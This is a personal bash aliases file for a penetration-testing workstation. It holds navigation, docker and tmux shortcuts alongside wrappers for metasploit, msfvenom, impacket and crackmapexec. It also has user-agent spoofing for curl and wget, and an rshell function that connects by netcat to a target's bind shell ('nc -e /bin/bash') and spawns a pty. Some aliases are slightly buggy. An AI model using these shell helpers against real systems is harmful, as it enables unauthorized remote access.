#reload bashrc after changes
#source ~/.bashrc or Ralias

## ---Must be in  ~/.bashrc ---
#if [ -f ~/.bash_aliases ]; then
#. ~/.bash_aliases
#fi
#--end--

# git install bash_aliases
# wget -O ~/.bash_aliases https://raw.githubusercontent.com/kilger/bash_aliases/main/.bash_aliases
alias Ualias="wget -O ~/.bash_aliases https://raw.githubusercontent.com/kilger/bash_aliases/main/.bash_aliases"
#reload alias
alias Ralias="source ~/.bashrc"

alias UR="Ualias && Ralias"

alias Newt="Ap /home/user/Syncthing/920/PenTest/Ansible/tmuxp_template.yml"
alias Newtarget=Newt

# navigation
alias Gopen="cd ~/Syncthing/920/PenTest/"
alias Gopw="cd ~/Syncthing/920/PenTest/pwk"
alias Gopwk="cd ~/Syncthing/920/PenTest/pwk"
alias Gos="cd ~/Syncthing/920/PenTest/Scripts"
alias Got="cd ~/Syncthing/920/PenTest/Tools"


alias Psg='ps -ef | grep -i $1 '
#$ psg 384
alias Nsg='netstat -natp | grep -i $1 '
#$ nsg 3389

#apt install, just add package ie $sai ufw
alias Sai="sudo apt install -y"

# become root #
#alias root='sudo -i'
#alias su='sudo -i'
#sudo !! -rerun last command with sudo priv
alias F='sudo $(history -p !!)'

alias ..="cd .."
alias ...="cd ../.."
alias ....="cd ../../.."
alias .....="cd ../../../.."
alias ......="cd ../../../../.."

#ansible
alias Ap="ansible-playbook"
#ansible apt update for kali
alias Aptk='wget -O ~/ansible/task_aptk.yml https://raw.githubusercontent.com/kilger/kali_setup/main/task_apt.yml && Ap ~/ansible/task_aptk.yml'
#ansible apt update for ubuntu
alias Aptu='wget -O ~/ansible/task_aptu.yml https://raw.githubusercontent.com/kilger/ubuntu_setup/main/task_apt.yml && Ap ~/ansible/task_aptu.yml'
alias Aptopt='wget -O ~/ansible/task_opt.yml https://raw.githubusercontent.com/kilger/kali_setup/main/task_opt.yml && Ap ~/ansible/task_opt.yml' 

# Lock the screen (when going AFK)
alias Afk="/System/Library/CoreServices/Menu\ Extras/User.menu/Contents/Resources/CGSession -suspend"

alias C="sed '/^#\|^$\| *#/d'" 
#$ C pathtofile/<file>   cat like but remove blank commented lines

alias Cme='sudo crackmapexec'

#docker
alias testdocker="docker run hello-world"
alias Td="docker run hello-world"
alias dockershell="docker run --rm -i -t --entrypoint=/bin/bash"
alias dockershellsh="docker run --rm -i -t --entrypoint=/bin/sh"
alias impacket="docker run --rm -it rflathers/impacket"
alias Imp="docker run --rm -it rflathers/impacket"
alias metasploit="docker run --rm -it -v "${HOME}/.msf4:/home/msf/.msf4" metasploitframework/metasploit-framework ./msfconsole"
alias metasploitports="docker run --rm -it -v "${HOME}/.msf4:/home/msf/.msf4" -p 8443-8500:8443-8500 metasploitframework/metasploit-framework ./msfconsole"
alias msfvenomhere="docker run --rm -it -v "${HOME}/.msf4:/home/msf/.msf4" -v "${PWD}:/data" metasploitframework/metasploit-framework ./msfvenom"
alias postfiledumphere="docker run --rm -it -p80:3000 -v "${PWD}:/data" rflathers/postfiledump"
alias reqdump="docker run --rm -it -p 80:3000 rflathers/reqdump"
alias pwncat="docker build -t pwncat ."

#docker pull resilio/sync
alias Sync="docker run -d --name Sync -p 127.0.0.1:$WEBUI_PORT:8888 -p 55555 -v $DATA_FOLDER:/mnt/sync --restart on-failure resilio/sync"
alias Di="docker images"
alias Dk="docker kill"
alias Dl="docker login"
alias Dps="docker ps"
alias Ds="docker start"
alias Dt="docker run hello-world"
alias Dv="docker --version"


#exploitdb copy 
alias Ecp="cp /usr/share/exploitdb/exploits/"

#firewall
alias firewallsave="sudo iptables-save >" 
alias firewallrestore="sudo iptables-restore <"


#github
alias G=git
alias Ga="git add -A ."
alias Gc="git commit -m"
alias Gp="git push"
alias Gs="git status"
alias Gt="ssh -T git@github.com"

alias H=history

alias laa="ls -la"
alias lll="ls -all | less"
alias lt="ls --tree"

#IP
alias IP="dig +short myip.opendns.com @resolver1.opendns.com"
alias Ip='ip -s link show && echo IPv4 && ip -4 a s && echo IPv6 && ip -6 a s && echo "External IPv4" && IP'

#display all rules #
alias Iptl='sudo /sbin/iptables -L -n -v --line-numbers'
alias Iptli='sudo /sbin/iptables -L INPUT -n -v --line-numbers'
alias Iptlo='sudo /sbin/iptables -L OUTPUT -n -v --line-numbers'
alias Iptlf='sudo /sbin/iptables -L FORWORD -n -v --line-numbers'
alias Firewall='sudo iptables -L --line-numbers'

alias kali=$(ip addr | awk '/inet/ && /tun0/{sub(/\/.*$/,"",$2); print $2}')

#find the files that has been added/modified most recently:
alias lt="ls -alrt"

#Test internet speed
alias Netspeed="curl -L https://github.com/ddo/fast/releases/download/v0.0.4/fast_linux_amd64 -o fast && wget https://github.com/ddo/fast/releases/download/v0.0.4/fast_linux_amd64 -O fast"

alias Nc='sudo lsof -l -i +L -R -V'
alias Ne='sudo lsof -l -i +L -R -V | grep ESTABLISHED'
alias Nex='curl -s http://checkip.dyndns.org/ | sed "s/[a-zA-Z<>/ :]//g"'

alias N=nano
alias Nl="nano --linenumbers"

#alias LetsHack=sudo systemctl start openvpn && sudo openvpn /thm/yourvpn-profile.ovpn
#alias Htb=sudo systemctl start openvpn && sudo openvpn /htb/yourvpn-profile.ovpn
#alias Thm=sudo systemctl start openvpn && sudo openvpn /thm/yourvpn-profile.ovpn
alias Thm='sudo openvpn ~/addusername.ovpn'
#alias Thmfs='$ sudo openvpn ~/addusername.ovpn 
# openvpn --script-security 2 --down vpn-down.sh --config

#powershell
alias powershell=pwsh

# Rbc pathtofile/<file>   remove blank commented
alias Rb="sed '/^$/d'" 
alias Rbc="sed '/^#\|^$\| *#/d'" 


#nmap search scripts
alias Nss="ls /usr/share/nmap/scripts/* | grep"
#usage $Nss *vuln*     $Nss ftp


#python virtual environments ansible
alias vansible4="source ansible4.0/bin/activate"
#alias vansible="cd ~/python-venv && source ansible4.0/bin/activate && cd ~/ansible"
alias vansible="cd ~/python_virtualenv/vansible/vansible4.0/ && source bin/activate && cd ~/ansible"

alias Python2="virtualenv python2-venv -p $(which python2)" && "source python2-venv/bin/activate"
alias P2a="virtualenv python2-venv -p $(which python2)" 
alias P2b="source python2-venv/bin/activate"
alias Python2=P2a&&P2b


alias Status="sudo systemctl status -l"
alias Restart="sudo shutdown -r now"


#rsync
alias Bu="rsync -avzx  /home linus@192.168.86.44:/volume1/NetBackup/$(hostname)"
#progress bar on file copy. Useful evenlocal.
alias Rsync="rsync --progress -ravz"

#alias ssh='_ssh_sesslog'
#getting errors

# tmux
alias Rtmux="tmux source-file ~/.tmux.conf"
alias T="tmux"
alias Ta="tmux attach-session -t "
alias Tk="tmux kill-session -t "
#load stored session
alias Tl="tmuxp load"
alias Tlpg="tmuxp load /home/kali/Syncthing/920/PenTest/pg/vpn.yml"
#alias Tl="tmuxp load  ~/.tmuxp/pentest01.yml"
alias Tlp="tmux list-panes"
alias Tls="tmux list-session"
alias Tn="tmux new -s "
alias Tsk="tmux send-keys"
alias Utmux="wget -O ~/.tmux.conf https://raw.githubusercontent.com/kilger/tmux/main/.tmux.conf"
#restore tmux session even after reboot
alias mux="pgrep -vx tmux > /dev/null && \
                tmux new -d -s delete-me && \
                tmux run-shell ~/.tmux/plugins/tmux-resurrect/scripts/restore.sh && \
                tmux kill-session -t delete-me && \
                tmux attach || tmux attach"

#automatically launch tmux when you ssh into this machine
#if [ -z "$TMUX" ]; then
#    tmux attach -t default || tmux new -s default
#fi

# debian update system
alias Ud="sudo apt clean && sudo apt-get update -y && sudo apt-get upgrade -y"
alias Udall="sudo apt clean && sudo apt-get update -y && sudo apt-get upgrade -y && sudo apt-get dist-upgrade -y"
#alias update="sudo --sh -c '/root/bin/chk_disk && dnf update'"

# centos update sytem
# alias Uc

#check ports open
alias whatisopen="sudo lsof -i && sudo nmap -p- -sU -sS --open 127.0.0.1"

#toggle between the last two directories
#alias -="cd -"

#add date stamp to bash history
export HISTTIMEFORMAT="%F %T  "

#weather
alias weather="curl wttr.in/ "
#weather toronto

#-c flag in order to continue the download in case of problems
alias wget="wget -c"

#Red Team
export AGENT="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
alias curl="curl -A '$AGENT'"
alias wget="wget -U '$AGENT'"
#alias nmap="sudo grc nmap --script-args=\'http.useragent='$AGENT' \'"
alias nmap="sudo grc nmap"

#vpn
alias fsvpn="openvpn --script-security 2 --down vpn-down.sh --config "

alias sudo="sudo env \"PATH=$PATH\""

# file tree of current directory
alias tree="find . -print | sed -e 's;[^/]*/;|____;g;s;____|; |;g'"

#virtual python3
alias Vp="sudo apt update \
&& sudo apt install python3 python3-venv virtualenv python3-virtualenv -y \
&& Mkdir ~/python_virtualenv/vansible && virtualenv -p python3 vansible4.0 \
&& source ./vansible4.0/bin/activate && python3 -m pip install --upgrade pip \
&& python3 -m pip install ansible==4.0. \
&& cd ~/ansible" 

#virtual python3 setup
alias Vps="sudo apt update \
&& mkdir ~/ansible \
&& sudo apt install python3 python3-venv virtualenv python3-virtualenv -y \
&& Mkdir ~/python_virtualenv/vansible && virtualenv -p python3 vansible4.0 \
&& source ./vansible4.0/bin/activate && python3 -m pip install --upgrade pip \
&& python3 -m pip install ansible==4.0. \
&& cd ~/ansible" 

#Functions:
#shown the contents of a directory immediately after moving to it by cd DIRECTORY
cdl()    {
  cd"$@";
  ls -al;
}

#https://github.com/phiresky/ripgrep-all
# $ rga-fzf <password>
rga-fzf() {
	RG_PREFIX="rga --files-with-matches"
	local file
	file="$(
		FZF_DEFAULT_COMMAND="$RG_PREFIX '$1'" \
			fzf --sort --preview="[[ ! -z {} ]] && rga --pretty --context 5 {q} {}" \
				--phony -q "$1" \
				--bind "change:reload:$RG_PREFIX {q}" \
				--preview-window="70%:wrap"
	)" &&
	echo "opening $file" &&
	xdg-open "$file"
}

function dockershell() {
    docker run --rm -i -t --entrypoint=/bin/bash "$@"
}

function dockershellsh() {
    docker run --rm -i -t --entrypoint=/bin/sh "$@"
}

function dockershellhere() {
    dirname=${PWD##*/}
    docker run --rm -it --entrypoint=/bin/bash -v `pwd`:/${dirname} -w /${dirname} "$@"
}

function dockershellshhere() {
    docker run --rm -it --entrypoint=/bin/sh -v `pwd`:/${dirname} -w /${dirname} "$@"
}

function dockerwindowshellhere() {
    dirname=${PWD##*/}
    docker -c 2019-box run --rm -it -v "C:${PWD}:C:/source" -w "C:/source" "$@"
}

function impacket() {
    docker run --rm -it rflathers/impacket "$@"
}
#SMB Server with Impacket $smbserverhere in the folder to share, access \\IP\share
function smbservehere() {
    local sharename
    [[ -z $1 ]] && sharename="SHARE" || sharename=$1
    docker run --rm -it -p 445:445 -v "${PWD}:/tmp/serve" rflathers/impacket smbserver.py -smb2support $sharename /tmp/serve
    #sudo iptables -I INPUT 1 -p tcp --dport 445 -j ACCEPT
}

#Serving HTTP Files w nginx can browse the contents with a browser, or use curl/wget/invoke-webrequest:  \\IP
# $ nginxhere in folder to share
function nginxhere() {
    docker run --rm -it -p 80:80 -p 443:443 -v "${PWD}:/srv/data" rflathers/nginxserve
    #sudo iptables -I INPUT 1 -p tcp --dport 80 -j ACCEPT
    #sudo iptables -I INPUT 1 -p tcp --dport 443 -j ACCEPT
}

function webdavhere() {
    docker run --rm -it -p 80:80 -v "${PWD}:/srv/data/share" rflathers/webdav
}

function metasploitports() {
    docker run --rm -it -v "${HOME}/.msf4:/home/msf/.msf4" -p 8443-8500:8443-8500 metasploitframework/metasploit-framework ./msfconsole "$@"
}

function msfvenomhere() {
    docker run --rm -it -v "${HOME}/.msf4:/home/msf/.msf4" -v "${PWD}:/data" metasploitframework/metasploit-framework ./msfvenom "$@"
}

function reqdump() {
    docker run --rm -it -p 80:3000 rflathers/reqdump
}

function postfiledumphere() {
    docker run --rm -it -p80:3000 -v "${PWD}:/data" rflathers/postfiledump
}

function msfvenom4() {
    local entrydir="/usr/src/metasploit-framework"
    local image="metasploitframework/metasploit-framework:latest"
    local name="msfvenom_$(head -c 8 /dev/random | xxd -p)"

    mkdir -p "$HOME/.msf4"
    docker run -e MSF_GID=$(id -g) -e MSF_UID=$(id -u) \
        --entrypoint "$entrydir/docker/entrypoint.sh" -i \
        --name "$name" --rm -tv "$HOME/.msf4":/home/msf/.msf4 \
        -v "$(pwd)":/msf:Z -w /msf $image "$entrydir/msfvenom" "$@"
}

function Mkdir () { mkdir -p "$@" && eval cd "\"\$$#\""; }

#Change directories and view the contents
function Cd() {
    DIR="$*";
        # if no DIR given, go home
        if [ $# -lt 1 ]; then
                DIR=$HOME;
    fi;
    builtin cd "${DIR}" && \
    # use your preferred ls command
        ls -F --color=auto
}

#function _ssh_sesslog() {
#
#  _sesdir="<path/to/session/logs>"
#
#  mkdir -p "${_sesdir}" && \
#  ssh $@ 2>&1 | tee -a "${_sesdir}/$(date +%Y%m%d).log"
#
#}
# Alias: alias ssh='_ssh_sesslog'


# Get ASN
# Dependencies:  - curl & python

function GetASN() {

  local _ip="$1"

  local _curl_base="curl --request GET"
  local _timeout="15"

  _asn=$($_curl_base -ks -m "$_timeout" "http://ip-api.com/json/${_ip}" | \
  python -c 'import sys, json; print json.load(sys.stdin)["as"]' 2>/dev/null)

  _state=$(echo $?)

  if [[ -z "$_ip" ]] || [[ "$_ip" == "null" ]] || [[ "$_state" -ne 0 ]]; then

    echo -en "Unsuccessful ASN gathering.\\n"

  else

    echo -en "$_ip > $_asn\\n"

  fi

}
# GetASN 1.1.1.1

# Domain resolve Dependencies: - curl & jq

function DomainResolve() {

  local _host="$1"

  local _curl_base="curl --request GET"
  local _timeout="15"

  _host_ip=$($_curl_base -ks -m "$_timeout" "https://dns.google.com/resolve?name=${_host}&type=A" | \
  jq '.Answer[0].data' | tr -d "\"" 2>/dev/null)

  if [[ -z "$_host_ip" ]] || [[ "$_host_ip" == "null" ]] ; then

    echo -en "Unsuccessful domain name resolution.\\n"

  else

    echo -en "$_host > $_host_ip\\n"

  fi

}
# Example: $ DomainResolve nmap.org

# rshell $IP PORT on target nc -lvnp PORT -e /bin/bash
rshell() {
  read rows cols < <(stty size)
  stty raw -echo
  cat <(cat << EOF
export TERM=xterm-256color
for PYTHON in python python2 python3; do /usr/bin/env \$PYTHON --version && break; done
exec /usr/bin/env \$PYTHON -c 'import pty;pty.spawn(("/bin/bash", "--rcfile", "/etc/skel/.bashrc"))'
stty rows $rows cols $cols
# User commands to execute right after connection
clear; \
{ \
cat /etc/issue; \
printf "\n"; \
printf "\\===========(\033[1;31m\$(whoami)@\$(hostname)\033[00m)===========/\n"; \
printf "|\n"; \
printf "| \033[1;34mKernel\033[00m :: \$(uname -r -s -m)\n"; \
printf "| \033[1;34mGroups\033[00m :: \$(groups)\n"; \
printf "\____________________________________________________________\n"; \ 
printf "\n"
ip --color=auto address || ifconfig; \
} 2>/dev/null ; \
echo;
EOF
  ) - | nc $@
  stty sane
}


#stop capturing in history
HISTIGNORE="cd:ls:exit:mkdir:Mkdir:pwd"
